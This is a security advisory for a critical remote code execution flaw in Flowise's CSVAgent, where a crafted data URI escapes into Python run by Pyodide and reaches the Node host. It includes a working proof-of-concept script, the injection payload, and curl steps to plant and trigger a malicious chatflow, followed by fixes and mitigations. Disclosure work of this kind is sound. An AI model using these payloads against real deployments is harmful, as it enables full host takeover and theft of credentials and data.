# [C] Flowise: RCE via CSVAgent csvFile data URI base64 segment is interpolated into Python source without validation

## Summary
Severity: Critical
Advisory: GHSA-4j8x-x6v7-w9rq
CVE: CVE-2026-69264
CWE: CWE-94, CWE-95
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-4j8x-x6v7-w9rq
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.3
- npm: `flowise-components` — affected >=0 <3.1.3

## Details
### Summary
Flowise's `CSVAgent` interpolates an attacker-controlled segment of the
`csvFile` data URI directly into a Python source-code template that is then
executed by Pyodide. Because Pyodide is loaded with the default `js` bridge
to `globalThis` (which on Node.js exposes `eval` and dynamic `import()`), the
attacker can break out of the Python string literal, hand a JS string to
`js.eval`, dynamically import any Node built-in module (`fs`, `child_process`,
…), and execute arbitrary file I/O or OS commands as the Flowise process.
The two validator paths around this code (`validatePythonCodeForDataFrame`
and `validateCustomReadCSVFunction`) are never applied to the bootstrap
template.

A workspace user with `chatflows:create` (or any `agentflows`/`chatflows`
update permission) plants a CSV Agent node with a crafted `csvFile`. Once the
chatflow is exposed via the (whitelisted, public) `POST /api/v1/prediction/:id`
endpoint, *any unauthenticated* request triggers the host RCE.

### Details

**Vulnerable file:** `packages/components/nodes/agents/CSVAgent/CSVAgent.ts`

The `run()` method extracts the file segment from the data URI by splitting on
`,` and using two `pop()` calls (lines 127–138):

```ts
} else {
    if (csvFileBase64.startsWith('[') && csvFileBase64.endsWith(']')) {
        files = JSON.parse(csvFileBase64)
    } else {
        files = [csvFileBase64]
    }

    for (const file of files) {
        if (!file) continue
        const splitDataURI = file.split(',')
        splitDataURI.pop()                           // discards trailing filename segment
        base64String += splitDataURI.pop() ?? ''     // captures the segment we attack
    }
}
```

The captured `base64String` is then **interpolated verbatim** into a Python
source string at lines 156–171:

```ts
const code = `import pandas as pd
import base64
from io import StringIO
import json

base64_string = "${base64String}"      // ← line 161: interpolation sink

decoded_data = base64.b64decode(base64_string)
csv_data = StringIO(decoded_data.decode('utf-8'))

df = pd.${customReadCSVFunc}
my_dict = df.dtypes.astype(str).to_dict()
print(my_dict)
json.dumps(my_dict)`
dataframeColDict = await pyodide.runPythonAsync(code)   // ← line 171: sink
```

**Validator gaps:**

- `validateCustomReadCSVFunction(customReadCSVFunc)` runs on line 147, but
  this only validates the `customReadCSV` field, not `base64String`.
- `validatePythonCodeForDataFrame(pythonCode)` runs on line 198, but only
  against the *LLM-emitted* Python that runs later — never against this
  bootstrap template.
- No content check (`^[A-Za-z0-9+/=]*$`) is applied to `base64String` before
  interpolation.

**Pyodide configuration** (`packages/components/nodes/agents/CSVAgent/core.ts`,
lines 7–16):

```ts
export async function LoadPyodide(): Promise<PyodideInterface> {
    if (pyodideInstance === undefined) {
        const { loadPyodide } = await import('pyodide')
        const obj: any = { packageCacheDir: path.join(getUserHome(), '.flowise', 'pyodideCacheDir') }
        pyodideInstance = await loadPyodide(obj)
        await pyodideInstance.loadPackage(['pandas', 'numpy'])
    }
    return pyodideInstance
}
```

Pyodide is loaded with default options. On Node.js, the default `js` module
inside Pyodide bridges to `globalThis`, exposing the JS `eval` function and
top-level dynamic `import()`. From injected Python, the attacker runs:

```python
import js
await js.eval(
    "(async () => {"
    "  const fs = await import('fs');"
    "  fs.writeFileSync('proof.txt', 'pwned');"
    "})()"
)
```

…which executes in the host Node.js process, **not** inside Pyodide's WASM
sandbox. Substituting `await import('child_process')` for `await import('fs')`
yields arbitrary OS-command execution via `cp.execSync(...)` with the same
primitive.

> **Node-version note.** The original PoC for this issue used
> `js.process.mainModule.require("child_process")`, which is a one-liner but
> only works on Node ≤ 13 because `process.mainModule` was deprecated and now
> returns `undefined` on Node 14+. The `js.eval` + dynamic-`import()` form
> above works on any Node 13.2+ in both CommonJS and ESM contexts, and was
> confirmed end-to-end against a stock `flowise@3.1.2` running on Node
> 20.20.2 — see [Verified end-to-end against live Flowise](#verified-end-to-end-against-live-flowise)
> below.

**Trigger path (post-plant):** the route `POST /api/v1/prediction/:id` is in
`WHITELIST_URLS` (`packages/server/src/utils/constants.ts:12`); when the
chatflow has no `apikeyid` set, it is reachable unauthenticated. A prediction
request runs the chatflow, instantiates `CSVAgent`, and executes the malicious
bootstrap.

### PoC

Verified end-to-end on the cloned repo (commit
`a3ffe6611b0986d646b9cd8bb8787d4fdcf9be6d`, the same commit the prior audit
was based on).

#### Reproducer setup

Two files. Save the first as `package.json`, the second as
`repro_a1_pyodide.js`, then `npm install && node repro_a1_pyodide.js` in the
same directory.

**`package.json`:**

```json
{
  "name": "poc-flowise-s1",
  "version": "1.0.0",
  "type": "commonjs",
  "dependencies": {
    "pyodide": "^0.29.3"
  }
}
```

**`repro_a1_pyodide.js`** — mirrors `CSVAgent.ts:127-138` (the data-URI
parser) and `:156-171` (the Python template), then runs the assembled Python
through real Pyodide. The injection segment is checked for commas before
assembly to confirm it cannot be fragmented by the JS-side `split(',')`.

```js
// Full host-RCE PoC for Flowise CSVAgent base64-injection.
//
// Loads real pyodide (matching how core.ts:LoadPyodide() boots it) and runs
// the Python that CSVAgent.ts:156-170 would assemble for an attacker-controlled
// csvFile data URI. Demonstrates:
//   1. JS-side template-literal interpolation produces malicious Python
//   2. validatePythonCodeForDataFrame is bypassed (it never inspects this code path)
//   3. Pyodide-on-Node `js` bridge reaches Node's fs module via dynamic
//      import('fs') -> host file write
//
// CONSTRAINTS:
//   * csvFile is split on `,` by the agent (CSVAgent.ts:135-137) — segment[2]
//     of the data URI is what becomes `base64_string`, so this segment must
//     contain NO raw `,` bytes.
//   * Inside a Python double-quoted string literal, `,` is the escape
//     for `,`. The data-URI parser sees the 6 raw bytes `\`, `u`, `0`, `0`,
//     `2`, `c` (no commas), but Python's lexer turns them into commas at
//     runtime — letting us pass multiple arguments to JS functions inside
//     the Python source.
//
// NODE-VERSION NOTE: an earlier revision of this PoC used
//   `cp = js.process.mainModule.require("child_process"); cp.execSync(...)`
// which is shorter but only works on Node ≤ 13 — `process.mainModule` was
// deprecated and now returns `undefined` on Node 14+, so the inner
// `.require(...)` silently no-ops. The `js.eval` + dynamic-`import()` form
// below works on any Node 13.2+ in both CommonJS and ESM contexts and was
// confirmed end-to-end against `flowise@3.1.2` running on Node 20.20.2.

const fs = require('fs')
const path = require('path')
const { loadPyodide } = require('pyodide')

const proofName = 'flowise_a1_pyodide_proof.txt'
const proofPath = path.resolve(__dirname, proofName)
const proofMarker = 'FLOWISE_A1_HOST_RCE_via_pyodide_dynamic_import'

// --- Attacker payload (Python; comma-free) ----------------------------------
// Closes the `base64_string = "` literal with `";`, runs malicious Python,
// then `#` comments out the surviving closing `"` so the rest of the
// bootstrap template still parses.
const pythonInjection =
    '";\n' +
    'import js\n' +
    `await js.eval("(async () => { const fs = await import('fs'); fs.writeFileSync('${proofName}'\\u002c '${proofMarker}'); })()")\n` +
    '#'

// Sanity: any commas would fragment the injection on the JS side.
if (pythonInjection.includes(',')) {
    throw new Error('PoC bug: injection segment contains a comma — would be split by csvFile.split(",")')
}

const csvFile = `data:text/csv;base64,A,${pythonInjection},IGNORED`

// --- JS side: mirror CSVAgent.ts:127-138 ------------------------------------
const csvFileBase64 = csvFile
const files = csvFileBase64.startsWith('[') && csvFileBase64.endsWith(']') ? JSON.parse(csvFileBase64) : [csvFileBase64]
let base64String = ''
for (const file of files) {
    if (!file) continue
    const splitDataURI = file.split(',')
    splitDataURI.pop()
    base64String += splitDataURI.pop() ?? ''
}

// --- JS side: mirror CSVAgent.ts:156-170 (pandas import omitted) ------------
// We omit `import pandas as pd` so we don't need to load pandas (~30 MB) just
// to demonstrate the injection. The real flow's pyodide instance preloads
// pandas via LoadPyodide() (core.ts:12). The injection point and validator
// bypass are identical either way.
const code = `import base64
from io import StringIO
import json

base64_string = "${base64String}"

decoded_data = base64.b64decode(base64_string)
csv_data = StringIO(decoded_data.decode('utf-8'))
print("post-injection bootstrap continued; base64_string =", repr(base64_string))
`

console.log('--- Assembled Python (passed verbatim to pyodide.runPythonAsync) ---')
console.log(code)
console.log('--- end ---\n')

;(async () => {
    try { fs.unlinkSync(proofPath) } catch {}

    console.log('[*] Loading pyodide...')
    const pyodide = await loadPyodide()
    console.log('[*] Pyodide loaded; running attacker-assembled Python...\n')

    try {
        await pyodide.runPythonAsync(code)
    } catch (e) {
        console.log('[!] runPythonAsync threw (the bootstrap may fail AFTER the injection has executed):')
        console.log(String(e).split('\n').slice(0, 8).join('\n'))
    }

    // give the spawned writeFileSync a moment to flush
    await new Promise((r) => setTimeout(r, 500))

    console.log('\n--- Proof file at ' + proofPath + ' ---')
    if (fs.existsSync(proofPath)) {
        console.log(fs.readFileSync(proofPath, 'utf-8').trim())
        console.log('\n[+] HOST RCE CONFIRMED: file written by the Node host process via the pyodide js-bridge.')
    } else {
        console.log('[-] Proof file not present.')
    }
})()
```

#### What gets assembled

After the two `pop()` calls in `CSVAgent.ts:135-137` extract the third comma-separated segment, the Python text passed to `pyodide.runPythonAsync` becomes (note that Python's lexer resolves the `,` escapes inside the string literal back to commas, so the JS code actually receives `fs.writeFileSync('proof', 'marker')`):

```python
import base64
from io import StringIO
import json

base64_string = "";
import js
await js.eval("(async () => { const fs = await import('fs'); fs.writeFileSync('flowise_a1_pyodide_proof.txt', 'FLOWISE_A1_HOST_RCE_via_pyodide_dynamic_import'); })()")
#"

decoded_data = base64.b64decode(base64_string)
csv_data = StringIO(decoded_data.decode('utf-8'))
...
```

The `";` closes line 161's string literal; the injected statements execute
(awaiting the JS Promise that writes the proof file); the trailing `#`
comments out the dangling `"` so the rest of the bootstrap parses. The
remaining `b64decode("")` returns `b''` and `pd.read_csv` (in the live
template) then raises `pandas.errors.EmptyDataError`, but the
`fs.writeFileSync(...)` call has already fired in the Node host.

#### Observed output (after deleting any prior proof file)

```
[*] Loading pyodide...
[*] Pyodide loaded; running attacker-assembled Python...

--- Proof file at .../flowise_a1_pyodide_proof.txt ---
FLOWISE_A1_HOST_RCE_via_pyodide_dynamic_import

[+] HOST RCE CONFIRMED: file written by the Node host process via the pyodide js-bridge.
```

The proof file `flowise_a1_pyodide_proof.txt` is written by the Node host
process via the Pyodide `js` bridge → `js.eval(...)` →
`(await import('fs')).writeFileSync(...)`, confirming the escape from the
Pyodide WASM sandbox. The standalone repro omits `import pandas`, so no
post-injection exception is raised — but the live template (`pandas.read_csv`
on the empty buffer) throws `pandas.errors.EmptyDataError` *after* the host
write has already happened, which is exactly the symptom an operator sees in
the chat panel.

#### Verified end-to-end against live Flowise

The standalone repro above proves the validator-bypass + sandbox-escape
primitive in isolation. The same payload was additionally verified against a
stock `flowise@3.1.2` install on Node 20.20.2:

| Step | Action |
|---|---|
| 1 | `npm install -g flowise` (Node 20.20.2, Linux x64) |
| 2 | `flowise start` → bind on `:3000` |
| 3 | UI: create admin + dummy OpenAI credential (any string for the API key — never validated; the exploit fires before the LLM is invoked) |
| 4 | Plant the attached `evil-csvagent-flow.json` in the chatflows DB (UI import or `POST /api/v1/chatflows`) |
| 5 | Open the chatflow → click chat → send any message |
| 6 | Chat panel shows `pandas.errors.EmptyDataError: No columns to parse from file` |
| 7 | `/home/<user>/flowise_a1_proof.txt` is now present, 46 bytes, content `FLOWISE_A1_HOST_RCE_via_pyodide_dynamic_import`, owner-uid matches the Flowise process uid |

Reproduction artifacts (`evil-csvagent-flow.json`, `build-flow-v2.js`,
`test-flow.js`, the captured `evidence-bundle.txt`) live at
`pocs/S1-csvagent-csvfile-rce/triage-response/`. The chatflow JSON is built
verbatim from Flowise's bundled `marketplaces/chatflows/CSV Agent.json`
template with three minimal edits — the malicious `csvFile` data URI on
`csvAgent_0`, a placeholder credential on `chatOpenAI_0`, and the sticky
note removed — so it imports cleanly into any Flowise 3.x without the
`reactFlowNodeData.inputParams.find(...)` 500 the maintainer initially saw
when handed a hand-crafted minimal flow.

#### End-to-end against a live Flowise instance

The local PoC above proves the validator-bypass + sandbox-escape primitive.
To reach the same primitive over HTTP against a deployed Flowise, two
requests suffice:

```bash
# Step 1 — authenticated chatflow author (any user with chatflows:create
# in OSS, this is typically every registered user) plants the flow.
# evil-csvagent-flow.json is a chatflow whose csvAgent node has
#   inputs.csvFile = "data:text/csv;base64,A,<comma-free python payload>,IGNORED"
curl -X POST https://target/api/v1/chatflows \
  -H "Authorization: Bearer <api-key with chatflows:create>" \
  -H "Content-Type: application/json" \
  -d @evil-csvagent-flow.json
# → returns chatflow id, e.g. "<flow-uuid>"

# Step 2 — anyone, no auth (the route is whitelisted at
# packages/server/src/utils/constants.ts:12) triggers execution:
curl -X POST https://target/api/v1/prediction/<flow-uuid> \
  -H "Content-Type: application/json" \
  -d '{"question":"go"}'
```

Step 1 is the only authenticated step; Step 2 is unauthenticated when
`chatflow.apikeyid` is unset (the default for newly created chatflows).

### Impact

- **Class:** Remote Code Execution via Python-template injection escaping the
  Pyodide sandbox through the `js` bridge.
- **Affected:** every Flowise deployment that exposes a chatflow containing a
  `CSVAgent` node where `csvFile` is operator-supplied (i.e., overridable via
  `nodeOverrides` for the API caller, or planted by any user with chatflow
  edit permission).
- **Prerequisites:** one user with `chatflows:create` / `chatflows:update` /
  `agentflows:create` / `agentflows:update` to plant the chatflow once. The
  trigger is unauthenticated when the chatflow has no `apikeyid` set (the
  default for newly created chatflows).
- **Result:** arbitrary OS-command execution as the Flowise process. Direct
  access to Flowise's encrypted-credentials key file, the entire database,
  the host filesystem, and any network resource the host can reach.

### Metadata

- **Affected versions:** Confirmed at commit
  `a3ffe6611b0986d646b9cd8bb8787d4fdcf9be6d` (main, 2026-04-28) and at
  `flowise@3.1.2`. The vulnerable code (`splitDataURI.pop()` + template-string
  interpolation) appears unchanged across this range. Earlier 3.x versions
  with the same data-URI parsing pattern are also believed to be affected,
  but I did not verify each historical tag.
- **Fixed version:** Unpatched at the audited commit.
- **CVSS v3.1:**
  `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` → Base score **9.9
  (Critical)**.
  - AV:N — public `/api/v1/prediction/:id` trigger.
  - AC:L — deterministic; no race / timing.
  - PR:L — one user with `chatflows:create` (or equivalent) plants the
    chatflow. In OSS deployments, any registered user typically has this.
  - UI:N — no user interaction required at trigger time.
  - S:C — Pyodide's WASM/Python sandbox is the intended security authority
    for this code path; the `js` bridge escape and the validator bypass break
    out to the Node host process.
  - C:H / I:H / A:H — full host compromise.
- **CWE:** CWE-94 (Improper Control of Generation of Code: 'Code Injection');
  more specifically CWE-95 (Improper Neutralization of Directives in
  Dynamically Evaluated Code: 'Eval Injection').

### Remediation

**Maintainer fix (preferred — eliminates string-interpolation entirely):**
pass the base64 value through Pyodide's `globals.set` API instead of
template-string interpolation. In `packages/components/nodes/agents/CSVAgent/CSVAgent.ts`,
replace the construction at lines 156–171 with something like:

```ts
const pyodide = await LoadPyodide()
pyodide.globals.set('base64_string', base64String)
const code = `import pandas as pd
import base64
from io import StringIO
import json

decoded_data = base64.b64decode(base64_string)

csv_data = StringIO(decoded_data.decode('utf-8'))

df = pd.${customReadCSVFunc}
my_dict = df.dtypes.astype(str).to_dict()
print(my_dict)
json.dumps(my_dict)`
dataframeColDict = await pyodide.runPythonAsync(code)
```

This keeps the value as a Python `str` object that never enters the source
text. Apply the same change to `AirtableAgent.ts` if it follows the same
pattern.

**Defense in depth (recommended as well):**
1. Validate `base64String` against `^[A-Za-z0-9+/=]*$` before interpolation
   (rejects every escape character used in the PoC).
2. Disable Pyodide's `js` module on load. Pyodide supports `loadPyodide({ jsglobals: {} })`
   or the `js`-module-removal recipe; either prevents the bridge to
   `globalThis.process` on Node.js. Apply in
   `packages/components/nodes/agents/CSVAgent/core.ts:LoadPyodide`.
3. Run `validatePythonCodeForDataFrame` (or a stricter equivalent) over the
   bootstrap template, not only over the LLM-emitted code. The current
   ordering inverts the trust assumption.
4. Add a positive allow-list to `validateCustomReadCSVFunction` enumerating
   only safe pandas readers (e.g., `read_csv` and column-typed forms);
   exclude `read_pickle`, `read_html`, `read_xml`, `read_parquet`,
   `read_orc`, `read_feather`, `read_json` (these are independently
   exploitable — see S2/S3 in the submission roadmap).

**User mitigations until a patch ships:**
- Set `chatflow.apikeyid` on every chatflow that uses CSVAgent so
  `validateFlowAPIKey` enforces auth on `/api/v1/prediction/:id`.
- Set `chatbotConfig.allowedOrigins` to a strict list (note: this only
  defends against browser callers, not curl/server-side).
- Restrict `chatflows:create` / `agentflows:create` permissions to trusted
  users only.
- Where possible, strip `csvFile` from the `nodeOverrides` allow-list on
  affected chatflows so it cannot be supplied at prediction time.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-4j8x-x6v7-w9rq
- https://github.com/FlowiseAI/Flowise/pull/6499
- https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
